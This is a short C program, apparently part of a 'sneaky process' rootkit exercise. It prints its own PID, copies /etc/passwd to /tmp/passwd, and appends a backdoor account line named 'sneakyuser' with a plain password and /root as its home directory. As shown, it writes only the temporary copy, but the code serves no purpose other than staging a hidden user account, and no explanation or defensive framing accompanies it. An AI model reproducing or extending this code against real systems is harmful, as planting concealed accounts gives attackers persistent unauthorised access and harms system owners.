#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void etc_passwd() {
  FILE * etc_passwd = fopen("/etc/passwd", "r");
  if (etc_passwd == NULL) {
    fprintf(stderr, "%s", "unable to open /etc/passwd\n");
    exit(EXIT_FAILURE);
  }
  FILE * tmp_passwd = fopen("/tmp/passwd", "w");
  if (tmp_passwd == NULL) {
    fprintf(stderr, "%s", "unable to open /tmp/passwd\n");
    exit(EXIT_FAILURE);
  }
  size_t linecap = 0;
  ssize_t len = 0;
  char * line = NULL;
  while ((len = getline(&line, &linecap, etc_passwd)) >= 0) {
    fprintf(tmp_passwd, "%s", line);
  }
  free(line);
  //copy finished
  fprintf(tmp_passwd, "%s", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  if (fclose(etc_passwd) != 0) {
    perror("cannot close etc_passwd");
    exit(EXIT_FAILURE);
  }
  if (fclose(tmp_passwd) != 0) {
    perror("cannot close tmp_passwd");
    exit(EXIT_FAILURE);
  }
}
int main() {
  fprintf(stdout, "sneaky_process pid = %d\n", getpid());
  etc_passwd();
  return EXIT_SUCCESS;
}
